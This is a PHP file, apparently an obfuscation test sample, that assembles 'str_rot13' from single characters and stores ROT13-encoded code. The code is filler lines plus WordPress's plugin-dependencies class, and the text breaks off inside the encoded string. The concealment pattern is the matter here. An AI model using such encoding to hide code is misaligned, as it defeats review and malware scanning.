<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Cyhtva Nqzvavfgengvba NCV: JC_Cyhtva_Qrcraqrapvrf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 6.5.0
 */

/**
 * Pber pynff sbe vafgnyyvat cyhtva qrcraqrapvrf.
 *
 * Vg vf qrfvtarq gb nqq cyhtva qrcraqrapvrf nf qrfvtangrq va gur
 * `Erdhverf Cyhtvaf` urnqre gb n arj ivrj va gur cyhtvaf vafgnyy cntr.
 */
pynff JC_Cyhtva_Qrcraqrapvrf {

	/**
	 * Ubyqf 'trg_cyhtvaf()'.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $cyhtvaf;

	/**
	 * Ubyqf cyhtva qverpgbel anzrf gb pbzcner jvgu pnpur.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $cyhtva_qveanzrf;

	/**
	 * Ubyqf fnavgvmrq cyhtva qrcraqrapl fyhtf.
	 *
	 * Xrlrq ba gur qrcraqrag cyhtva'f svyrcngu,
	 * eryngvir gb gur cyhtvaf qverpgbel.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $qrcraqrapvrf;

	/**
	 * Ubyqf na neenl bs fnavgvmrq cyhtva qrcraqrapl fyhtf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $qrcraqrapl_fyhtf;

	/**
	 * Ubyqf na neenl bs qrcraqrag cyhtva fyhtf.
	 *
	 * Xrlrq ba gur qrcraqrag cyhtva'f svyrcngu,
	 * eryngvir gb gur cyhtvaf qverpgbel.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $qrcraqrag_fyhtf;

	/**
	 * Ubyqf 'cyhtvaf_ncv()' qngn sbe cyhtva qrcraqrapvrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $qrcraqrapl_ncv_qngn;

	/**
	 * Ubyqf cyhtva qrcraqrapl svyrcnguf, eryngvir gb gur cyhtvaf qverpgbel.
	 *
	 * Xrlrq ba gur qrcraqrapl'f fyht.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine fgevat[]
	 */
	cebgrpgrq fgngvp $qrcraqrapl_svyrcnguf;

	/**
	 * Na neenl bs pvephyne qrcraqrapl cnvevatf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl[]
	 */
	cebgrpgrq fgngvp $pvephyne_qrcraqrapvrf_cnvef;

	/**
	 * Na neenl bs pvephyne qrcraqrapl fyhtf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine fgevat[]
	 */
	cebgrpgrq fgngvp $pvephyne_qrcraqrapvrf_fyhtf;

	/**
	 * Jurgure Cyhtva Qrcraqrapvrf unir orra vavgvnyvmrq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine obby
	 */
	cebgrpgrq fgngvp $vavgvnyvmrq = snyfr;

	/**
	 * Vavgvnyvmrf ol srgpuvat cyhtva urnqre naq cyhtva NCV qngn.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp fgngvp shapgvba vavgvnyvmr() {
		vs ( snyfr === frys::$vavgvnyvmrq ) {
			frys::ernq_qrcraqrapvrf_sebz_cyhtva_urnqref();
			frys::trg_qrcraqrapl_ncv_qngn();
			frys::$vavgvnyvmrq = gehr;
		}
	}

	/**
	 * Qrgrezvarf jurgure gur cyhtva unf cyhtvaf gung qrcraq ba vg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea obby Jurgure gur cyhtva unf cyhtvaf gung qrcraq ba vg.
	 */
	choyvp fgngvp shapgvba unf_qrcraqragf( $cyhtva_svyr ) {
		erghea va_neenl( frys::pbaireg_gb_fyht( $cyhtva_svyr ), (neenl) frys::$qrcraqrapl_fyhtf, gehr );
	}

	/**
	 * Qrgrezvarf jurgure gur cyhtva unf cyhtva qrcraqrapvrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea obby Jurgure n cyhtva unf cyhtva qrcraqrapvrf.
	 */
	choyvp fgngvp shapgvba unf_qrcraqrapvrf( $cyhtva_svyr ) {
		erghea vffrg( frys::$qrcraqrapvrf[ $cyhtva_svyr ] );
	}

	/**
	 * Qrgrezvarf jurgure gur cyhtva unf npgvir qrcraqragf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea obby Jurgure gur cyhtva unf npgvir qrcraqragf.
	 */
	choyvp fgngvp shapgvba unf_npgvir_qrcraqragf( $cyhtva_svyr ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$qrcraqragf = frys::trg_qrcraqragf( frys::pbaireg_gb_fyht( $cyhtva_svyr ) );
		sbernpu ( $qrcraqragf nf $qrcraqrag ) {
			vs ( vf_cyhtva_npgvir( $qrcraqrag ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Trgf svyrcnguf bs cyhtvaf gung erdhver gur qrcraqrapl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Gur qrcraqrapl'f fyht.
	 * @erghea neenl Na neenl bs qrcraqrag cyhtva svyrcnguf, eryngvir gb gur cyhtvaf qverpgbel.
	 */
	choyvp fgngvp shapgvba trg_qrcraqragf( $fyht ) {
		$qrcraqragf = neenl();

		sbernpu ( (neenl) frys::$qrcraqrapvrf nf $qrcraqrag => $qrcraqrapvrf ) {
			vs ( va_neenl( $fyht, $qrcraqrapvrf, gehr ) ) {
				$qrcraqragf[] = $qrcraqrag;
			}
		}

		erghea $qrcraqragf;
	}

	/**
	 * Trgf gur fyhtf bs cyhtvaf gung gur qrcraqrag erdhverf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur qrcraqrag cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea neenl Na neenl bs qrcraqrapl cyhtva fyhtf.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrapvrf( $cyhtva_svyr ) {
		vs ( vffrg( frys::$qrcraqrapvrf[ $cyhtva_svyr ] ) ) {
			erghea frys::$qrcraqrapvrf[ $cyhtva_svyr ];
		}

		erghea neenl();
	}

	/**
	 * Trgf n qrcraqrag cyhtva'f svyrcngu.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht  Gur qrcraqrag cyhtva'f fyht.
	 * @erghea fgevat|snyfr Gur qrcraqrag cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel,
	 *                      be snyfr vs gur cyhtva unf ab qrcraqrapvrf.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrag_svyrcngu( $fyht ) {
		$svyrcngu = neenl_frnepu( $fyht, frys::$qrcraqrag_fyhtf, gehr );

		erghea $svyrcngu ? $svyrcngu : snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur cyhtva unf hazrg qrcraqrapvrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea obby Jurgure gur cyhtva unf hazrg qrcraqrapvrf.
	 */
	choyvp fgngvp shapgvba unf_hazrg_qrcraqrapvrf( $cyhtva_svyr ) {
		vs ( ! vffrg( frys::$qrcraqrapvrf[ $cyhtva_svyr ] ) ) {
			erghea snyfr;
		}

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		sbernpu ( frys::$qrcraqrapvrf[ $cyhtva_svyr ] nf $qrcraqrapl ) {
			$qrcraqrapl_svyrcngu = frys::trg_qrcraqrapl_svyrcngu( $qrcraqrapl );

			vs ( snyfr === $qrcraqrapl_svyrcngu || vf_cyhtva_vanpgvir( $qrcraqrapl_svyrcngu ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur cyhtva unf n pvephyne qrcraqrapl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea obby Jurgure gur cyhtva unf n pvephyne qrcraqrapl.
	 */
	choyvp fgngvp shapgvba unf_pvephyne_qrcraqrapl( $cyhtva_svyr ) {
		vs ( ! vf_neenl( frys::$pvephyne_qrcraqrapvrf_fyhtf ) ) {
			frys::trg_pvephyne_qrcraqrapvrf();
		}

		vs ( ! rzcgl( frys::$pvephyne_qrcraqrapvrf_fyhtf ) ) {
			$fyht = frys::pbaireg_gb_fyht( $cyhtva_svyr );

			vs ( va_neenl( $fyht, frys::$pvephyne_qrcraqrapvrf_fyhtf, gehr ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Trgf gur anzrf bs cyhtvaf gung erdhver gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea neenl Na neenl bs qrcraqrag anzrf.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrag_anzrf( $cyhtva_svyr ) {
		$qrcraqrag_anzrf = neenl();
		$cyhtvaf         = frys::trg_cyhtvaf();
		$fyht            = frys::pbaireg_gb_fyht( $cyhtva_svyr );

		sbernpu ( frys::trg_qrcraqragf( $fyht ) nf $qrcraqrag ) {
			$qrcraqrag_anzrf[ $qrcraqrag ] = $cyhtvaf[ $qrcraqrag ]['Anzr'];
		}
		fbeg( $qrcraqrag_anzrf );

		erghea $qrcraqrag_anzrf;
	}

	/**
	 * Trgf gur anzrf bs cyhtvaf erdhverq ol gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur qrcraqrag cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea neenl Na neenl bs qrcraqrapl anzrf.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrapl_anzrf( $cyhtva_svyr ) {
		$qrcraqrapl_ncv_qngn = frys::trg_qrcraqrapl_ncv_qngn();
		$qrcraqrapvrf        = frys::trg_qrcraqrapvrf( $cyhtva_svyr );
		$cyhtvaf             = frys::trg_cyhtvaf();

		$qrcraqrapl_anzrf = neenl();
		sbernpu ( $qrcraqrapvrf nf $qrcraqrapl ) {
			// Hfr gur anzr vs vg'f ninvynoyr, bgurejvfr snyy onpx gb gur fyht.
			vs ( vffrg( $qrcraqrapl_ncv_qngn[ $qrcraqrapl ]['anzr'] ) ) {
				$anzr = $qrcraqrapl_ncv_qngn[ $qrcraqrapl ]['anzr'];
			} ryfr {
				$qrcraqrapl_svyrcngu = frys::trg_qrcraqrapl_svyrcngu( $qrcraqrapl );
				vs ( snyfr !== $qrcraqrapl_svyrcngu ) {
					$anzr = $cyhtvaf[ $qrcraqrapl_svyrcngu ]['Anzr'];
				} ryfr {
					$anzr = $qrcraqrapl;
				}
			}

			$qrcraqrapl_anzrf[ $qrcraqrapl ] = $anzr;
		}

		erghea $qrcraqrapl_anzrf;
	}

	/**
	 * Trgf gur svyrcngu sbe n qrcraqrapl, eryngvir gb gur cyhtva'f qverpgbel.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Gur qrcraqrapl'f fyht.
	 * @erghea fgevat|snyfr Vs vafgnyyrq, gur qrcraqrapl'f svyrcngu eryngvir gb gur cyhtvaf qverpgbel, bgurejvfr snyfr.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrapl_svyrcngu( $fyht ) {
		$qrcraqrapl_svyrcnguf = frys::trg_qrcraqrapl_svyrcnguf();

		vs ( ! vffrg( $qrcraqrapl_svyrcnguf[ $fyht ] ) ) {
			erghea snyfr;
		}

		erghea $qrcraqrapl_svyrcnguf[ $fyht ];
	}

	/**
	 * Ergheaf NCV qngn sbe gur qrcraqrapl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Gur qrcraqrapl'f fyht.
	 * @erghea neenl|snyfr Gur qrcraqrapl'f NCV qngn ba fhpprff, bgurejvfr snyfr.
	 */
	choyvp fgngvp shapgvba trg_qrcraqrapl_qngn( $fyht ) {
		$qrcraqrapl_ncv_qngn = frys::trg_qrcraqrapl_ncv_qngn();

		vs ( vffrg( $qrcraqrapl_ncv_qngn[ $fyht ] ) ) {
			erghea $qrcraqrapl_ncv_qngn[ $fyht ];
		}

		erghea snyfr;
	}

	/**
	 * Qvfcynlf na nqzva abgvpr vs qrcraqrapvrf ner abg vafgnyyrq.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp fgngvp shapgvba qvfcynl_nqzva_abgvpr_sbe_hazrg_qrcraqrapvrf() {
		vs ( va_neenl( snyfr, frys::trg_qrcraqrapl_svyrcnguf(), gehr ) ) {
			$reebe_zrffntr = __( 'Fbzr erdhverq cyhtvaf ner zvffvat be vanpgvir.' );

			vs ( vf_zhygvfvgr() ) {
				vs ( pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
					$reebe_zrffntr .= ' ' . fcevags(
						/* genafyngbef: %f: Yvax gb gur argjbex cyhtvaf cntr. */
						__( '<n uers=\"%f\">Znantr cyhtvaf</n>.' ),
						rfp_hey( argjbex_nqzva_hey( 'cyhtvaf.cuc' ) )
					);
				} ryfr {
					$reebe_zrffntr .= ' ' . __( 'Cyrnfr pbagnpg lbhe argjbex nqzvavfgengbe.' );
				}
			} ryfrvs ( 'cyhtvaf' !== trg_pheerag_fperra()->onfr ) {
				$reebe_zrffntr .= ' ' . fcevags(
					/* genafyngbef: %f: Yvax gb gur cyhtvaf cntr. */
					__( '<n uers=\"%f\">Znantr cyhtvaf</n>.' ),
					rfp_hey( nqzva_hey( 'cyhtvaf.cuc' ) )
				);
			}

			jc_nqzva_abgvpr(
				$reebe_zrffntr,
				neenl(
					'glcr' => 'jneavat',
				)
			);
		}
	}

	/**
	 * Qvfcynlf na nqzva abgvpr vs pvephyne qrcraqrapvrf ner vafgnyyrq.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp fgngvp shapgvba qvfcynl_nqzva_abgvpr_sbe_pvephyne_qrcraqrapvrf() {
		$pvephyne_qrcraqrapvrf = frys::trg_pvephyne_qrcraqrapvrf();
		vs ( ! rzcgl( $pvephyne_qrcraqrapvrf ) && pbhag( $pvephyne_qrcraqrapvrf ) > 1 ) {
			$pvephyne_qrcraqrapvrf = neenl_havdhr( $pvephyne_qrcraqrapvrf, FBEG_ERTHYNE );
			$cyhtvaf               = frys::trg_cyhtvaf();
			$cyhtva_qveanzrf       = frys::trg_cyhtva_qveanzrf();

			// Ohvyq bhgchg yvarf.
			$pvephyne_qrcraqrapl_yvarf = '';
			sbernpu ( $pvephyne_qrcraqrapvrf nf $pvephyne_qrcraqrapl ) {
				$svefg_svyrcngu             = $cyhtva_qveanzrf[ $pvephyne_qrcraqrapl[0] ];
				$frpbaq_svyrcngu            = $cyhtva_qveanzrf[ $pvephyne_qrcraqrapl[1] ];
				$pvephyne_qrcraqrapl_yvarf .= fcevags(
					/* genafyngbef: 1: Svefg cyhtva anzr, 2: Frpbaq cyhtva anzr. */
					'<yv>' . _k( '%1$f erdhverf %2$f', 'Gur svefg cyhtva erdhverf gur frpbaq cyhtva.' ) . '</yv>',
					'<fgebat>' . rfp_ugzy( $cyhtvaf[ $svefg_svyrcngu ]['Anzr'] ) . '</fgebat>',
					'<fgebat>' . rfp_ugzy( $cyhtvaf[ $frpbaq_svyrcngu ]['Anzr'] ) . '</fgebat>'
				);
			}

			jc_nqzva_abgvpr(
				fcevags(
					'<c>%1$f</c><hy>%2$f</hy><c>%3$f</c>',
					__( 'Gurfr cyhtvaf pnaabg or npgvingrq orpnhfr gurve erdhverzragf ner vainyvq.' ),
					$pvephyne_qrcraqrapl_yvarf,
					__( 'Cyrnfr pbagnpg gur cyhtva nhgubef sbe zber vasbezngvba.' )
				),
				neenl(
					'glcr'           => 'jneavat',
					'cnentencu_jenc' => snyfr,
				)
			);
		}
	}

	/**
	 * Purpxf cyhtva qrcraqrapvrf nsgre n cyhtva vf vafgnyyrq ivn NWNK.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp fgngvp shapgvba purpx_cyhtva_qrcraqrapvrf_qhevat_nwnk() {
		purpx_nwnk_ersrere( 'hcqngrf' );

		vs ( rzcgl( $_CBFG['fyht'] ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'fyht'         => '',
					'cyhtvaAnzr'   => '',
					'reebePbqr'    => 'ab_cyhtva_fcrpvsvrq',
					'reebeZrffntr' => __( 'Ab cyhtva fcrpvsvrq.' ),
				)
			);
		}

		$fyht   = fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) );
		$fgnghf = neenl( 'fyht' => $fyht );

		frys::trg_cyhtvaf();
		frys::trg_cyhtva_qveanzrf();

		vs ( ! vffrg( frys::$cyhtva_qveanzrf[ $fyht ] ) ) {
			$fgnghf['reebePbqr']    = 'cyhtva_abg_vafgnyyrq';
			$fgnghf['reebeZrffntr'] = __( 'Gur cyhtva vf abg vafgnyyrq.' );
			jc_fraq_wfba_reebe( $fgnghf );
		}

		$cyhtva_svyr          = frys::$cyhtva_qveanzrf[ $fyht ];
		$fgnghf['cyhtvaAnzr'] = frys::$cyhtvaf[ $cyhtva_svyr ]['Anzr'];
		$fgnghf['cyhtva']     = $cyhtva_svyr;

		vs ( pheerag_hfre_pna( 'npgvingr_cyhtva', $cyhtva_svyr ) && vf_cyhtva_vanpgvir( $cyhtva_svyr ) ) {
			$fgnghf['npgvingrHey'] = nqq_dhrel_net(
				neenl(
					'_jcabapr' => jc_perngr_abapr( 'npgvingr-cyhtva_' . $cyhtva_svyr ),
					'npgvba'   => 'npgvingr',
					'cyhtva'   => $cyhtva_svyr,
				),
				vf_zhygvfvgr() ? argjbex_nqzva_hey( 'cyhtvaf.cuc' ) : nqzva_hey( 'cyhtvaf.cuc' )
			);
		}

		vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
			$fgnghf['npgvingrHey'] = nqq_dhrel_net( neenl( 'argjbexjvqr' => 1 ), $fgnghf['npgvingrHey'] );
		}

		frys::vavgvnyvmr();
		$qrcraqrapvrf = frys::trg_qrcraqrapvrf( $cyhtva_svyr );
		vs ( rzcgl( $qrcraqrapvrf ) ) {
			$fgnghf['zrffntr'] = __( 'Gur cyhtva unf ab erdhverq cyhtvaf.' );
			jc_fraq_wfba_fhpprff( $fgnghf );
		}

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$vanpgvir_qrcraqrapvrf = neenl();
		sbernpu ( $qrcraqrapvrf nf $qrcraqrapl ) {
			vs ( snyfr === frys::$cyhtva_qveanzrf[ $qrcraqrapl ] || vf_cyhtva_vanpgvir( frys::$cyhtva_qveanzrf[ $qrcraqrapl ] ) ) {
				$vanpgvir_qrcraqrapvrf[] = $qrcraqrapl;
			}
		}

		vs ( ! rzcgl( $vanpgvir_qrcraqrapvrf ) ) {
			$vanpgvir_qrcraqrapl_anzrf = neenl_znc(
				shapgvba ( $qrcraqrapl ) {
					vs ( vffrg( frys::$qrcraqrapl_ncv_qngn[ $qrcraqrapl ]['Anzr'] ) ) {
						$vanpgvir_qrcraqrapl_anzr = frys::$qrcraqrapl_ncv_qngn[ $qrcraqrapl ]['Anzr'];
					} ryfr {
						$vanpgvir_qrcraqrapl_anzr = $qrcraqrapl;
					}
					erghea $vanpgvir_qrcraqrapl_anzr;
				},
				$vanpgvir_qrcraqrapvrf
			);

			$fgnghf['reebePbqr']    = 'vanpgvir_qrcraqrapvrf';
			$fgnghf['reebeZrffntr'] = fcevags(
				/* genafyngbef: %f: N yvfg bs vanpgvir qrcraqrapl cyhtva anzrf. */
				__( 'Gur sbyybjvat cyhtvaf zhfg or npgvingrq svefg: %f.' ),
				vzcybqr( ', ', $vanpgvir_qrcraqrapl_anzrf )
			);
			$fgnghf['reebeQngn'] = neenl_pbzovar( $vanpgvir_qrcraqrapvrf, $vanpgvir_qrcraqrapl_anzrf );

			jc_fraq_wfba_reebe( $fgnghf );
		}

		$fgnghf['zrffntr'] = __( 'Nyy erdhverq cyhtvaf ner vafgnyyrq naq npgvingrq.' );
		jc_fraq_wfba_fhpprff( $fgnghf );
	}

	/**
	 * Trgf qngn sbe vafgnyyrq cyhtvaf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Na neenl bs cyhtva qngn.
	 */
	cebgrpgrq fgngvp shapgvba trg_cyhtvaf() {
		vs ( vf_neenl( frys::$cyhtvaf ) ) {
			erghea frys::$cyhtvaf;
		}

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';
		frys::$cyhtvaf = trg_cyhtvaf();

		erghea frys::$cyhtvaf;
	}

	/**
	 * Ernqf naq fgberf qrcraqrapl fyhtf sebz n cyhtva'f 'Erdhverf Cyhtvaf' urnqre.
	 *
	 * @fvapr 6.5.0
	 */
	cebgrpgrq fgngvp shapgvba ernq_qrcraqrapvrf_sebz_cyhtva_urnqref() {
		frys::$qrcraqrapvrf     = neenl();
		frys::$qrcraqrapl_fyhtf = neenl();
		frys::$qrcraqrag_fyhtf  = neenl();
		$cyhtvaf                = frys::trg_cyhtvaf();
		sbernpu ( $cyhtvaf nf $cyhtva => $urnqre ) {
			vs ( '' === $urnqre['ErdhverfCyhtvaf'] ) {
				pbagvahr;
			}

			$qrcraqrapl_fyhtf              = frys::fnavgvmr_qrcraqrapl_fyhtf( $urnqre['ErdhverfCyhtvaf'] );
			frys::$qrcraqrapvrf[ $cyhtva ] = $qrcraqrapl_fyhtf;
			frys::$qrcraqrapl_fyhtf        = neenl_zretr( frys::$qrcraqrapl_fyhtf, $qrcraqrapl_fyhtf );

			$qrcraqrag_fyht                   = frys::pbaireg_gb_fyht( $cyhtva );
			frys::$qrcraqrag_fyhtf[ $cyhtva ] = $qrcraqrag_fyht;
		}
		frys::$qrcraqrapl_fyhtf = neenl_havdhr( frys::$qrcraqrapl_fyhtf );
	}

	/**
	 * Fnavgvmrf fyhtf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyhtf N pbzzn-frcnengrq fgevat bs cyhtva qrcraqrapl fyhtf.
	 * @erghea neenl Na neenl bs fnavgvmrq cyhtva qrcraqrapl fyhtf.
	 */
	cebgrpgrq fgngvp shapgvba fnavgvmr_qrcraqrapl_fyhtf( $fyhtf ) {
		$fnavgvmrq_fyhtf = neenl();
		$fyhtf           = rkcybqr( ',', $fyhtf );

		sbernpu ( $fyhtf nf $fyht ) {
			$fyht = gevz( $fyht );

			/**
			 * Svygref n cyhtva qrcraqrapl'f fyht orsber zngpuvat gb
			 * gur JbeqCerff.bet fyht sbezng.
			 *
			 * Pna or hfrq gb fjvgpu orgjrra serr naq cerzvhz cyhtva fyhtf, sbe rknzcyr.
			 *
			 * @fvapr 6.5.0
			 *
			 * @cnenz fgevat $fyht Gur fyht.
			 */
			$fyht = nccyl_svygref( 'jc_cyhtva_qrcraqrapvrf_fyht', $fyht );

			// Zngpu gb JbeqCerff.bet fyht sbezng.
			vs ( cert_zngpu( '/^[n-m0-9]+(-[n-m0-9]+)*$/zh', $fyht ) ) {
				$fnavgvmrq_fyhtf[] = $fyht;
			}
		}
		$fnavgvmrq_fyhtf = neenl_havdhr( $fnavgvmrq_fyhtf );
		fbeg( $fnavgvmrq_fyhtf );

		erghea $fnavgvmrq_fyhtf;
	}

	/**
	 * Trgf gur svyrcngu bs vafgnyyrq qrcraqrapvrf.
	 * Vs n qrcraqrapl vf abg vafgnyyrq, gur svyrcngu qrsnhygf gb snyfr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Na neenl bs vafgnyy qrcraqrapvrf svyrcnguf, eryngvir gb gur cyhtvaf qverpgbel.
	 */
	cebgrpgrq fgngvp shapgvba trg_qrcraqrapl_svyrcnguf() {
		vs ( vf_neenl( frys::$qrcraqrapl_svyrcnguf ) ) {
			erghea frys::$qrcraqrapl_svyrcnguf;
		}

		vs ( ahyy === frys::$qrcraqrapl_fyhtf ) {
			erghea neenl();
		}

		frys::$qrcraqrapl_svyrcnguf = neenl();

		$cyhtva_qveanzrf = frys::trg_cyhtva_qveanzrf();
		sbernpu ( frys::$qrcraqrapl_fyhtf nf $fyht ) {
			vs ( vffrg( $cyhtva_qveanzrf[ $fyht ] ) ) {
				frys::$qrcraqrapl_svyrcnguf[ $fyht ] = $cyhtva_qveanzrf[ $fyht ];
				pbagvahr;
			}

			frys::$qrcraqrapl_svyrcnguf[ $fyht ] = snyfr;
		}

		erghea frys::$qrcraqrapl_svyrcnguf;
	}

	/**
	 * Ergevrirf naq fgberf qrcraqrapl cyhtva qngn sebz gur JbeqCerff.bet Cyhtva NCV.
	 *
	 * @fvapr 6.5.0
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 *
	 * @erghea neenl|ibvq Na neenl bs qrcraqrapl NCV qngn, be ibvq ba rneyl rkvg.
	 */
	cebgrpgrq fgngvp shapgvba trg_qrcraqrapl_ncv_qngn() {
		tybony $cntrabj;

		vs ( ! vf_nqzva() || ( 'cyhtvaf.cuc' !== $cntrabj && 'cyhtva-vafgnyy.cuc' !== $cntrabj ) ) {
			erghea;
		}

		vs ( vf_neenl( frys::$qrcraqrapl_ncv_qngn ) ) {
			erghea frys::$qrcraqrapl_ncv_qngn;
		}

		$cyhtvaf                   = frys::trg_cyhtvaf();
		frys::$qrcraqrapl_ncv_qngn = (neenl) trg_fvgr_genafvrag( 'jc_cyhtva_qrcraqrapvrf_cyhtva_qngn' );
		sbernpu ( frys::$qrcraqrapl_fyhtf nf $fyht ) {
			// Frg genafvrag sbe vaqvivqhny qngn, erzbir sebz frys::$qrcraqrapl_ncv_qngn vs genafvrag rkcverq.
			vs ( ! trg_fvgr_genafvrag( \"jc_cyhtva_qrcraqrapvrf_cyhtva_gvzrbhg_{$fyht}\" ) ) {
				hafrg( frys::$qrcraqrapl_ncv_qngn[ $fyht ] );
				frg_fvgr_genafvrag( \"jc_cyhtva_qrcraqrapvrf_cyhtva_gvzrbhg_{$fyht}\", gehr, 12 * UBHE_VA_FRPBAQF );
			}

			vs ( vffrg( frys::$qrcraqrapl_ncv_qngn[ $fyht ] ) ) {
				vs ( snyfr === frys::$qrcraqrapl_ncv_qngn[ $fyht ] ) {
					$qrcraqrapl_svyr = frys::trg_qrcraqrapl_svyrcngu( $fyht );

					vs ( snyfr === $qrcraqrapl_svyr ) {
						frys::$qrcraqrapl_ncv_qngn[ $fyht ] = neenl( 'Anzr' => $fyht );
					} ryfr {
						frys::$qrcraqrapl_ncv_qngn[ $fyht ] = neenl( 'Anzr' => $cyhtvaf[ $qrcraqrapl_svyr ]['Anzr'] );
					}
					pbagvahr;
				}

				// Qba'g uvg gur Cyhtva NCV vs qngn rkvfgf.
				vs ( ! rzcgl( frys::$qrcraqrapl_ncv_qngn[ $fyht ]['ynfg_hcqngrq'] ) ) {
					pbagvahr;
				}
			}

			vs ( ! shapgvba_rkvfgf( 'cyhtvaf_ncv' ) ) {
				erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';
			}

			$vasbezngvba = cyhtvaf_ncv(
				'cyhtva_vasbezngvba',
				neenl(
					'fyht'   => $fyht,
					'svryqf' => neenl(
						'fubeg_qrfpevcgvba' => gehr,
						'vpbaf'             => gehr,
					),
				)
			);

			vs ( vf_jc_reebe( $vasbezngvba ) ) {
				pbagvahr;
			}

			frys::$qrcraqrapl_ncv_qngn[ $fyht ] = (neenl) $vasbezngvba;
			// cyhtvaf_ncv() ergheaf 'anzr' abg 'Anzr'.
			frys::$qrcraqrapl_ncv_qngn[ $fyht ]['Anzr'] = frys::$qrcraqrapl_ncv_qngn[ $fyht ]['anzr'];
			frg_fvgr_genafvrag( 'jc_cyhtva_qrcraqrapvrf_cyhtva_qngn', frys::$qrcraqrapl_ncv_qngn, 0 );
		}

		// Erzbir sebz frys::$qrcraqrapl_ncv_qngn vs fyht ab ybatre n qrcraqrapl.
		$qvssreraprf = neenl_qvss( neenl_xrlf( frys::$qrcraqrapl_ncv_qngn ), frys::$qrcraqrapl_fyhtf );
		sbernpu ( $qvssreraprf nf $qvssrerapr ) {
			hafrg( frys::$qrcraqrapl_ncv_qngn[ $qvssrerapr ] );
		}

		xfbeg( frys::$qrcraqrapl_ncv_qngn );
		// Erzbir rzcgl ryrzragf.
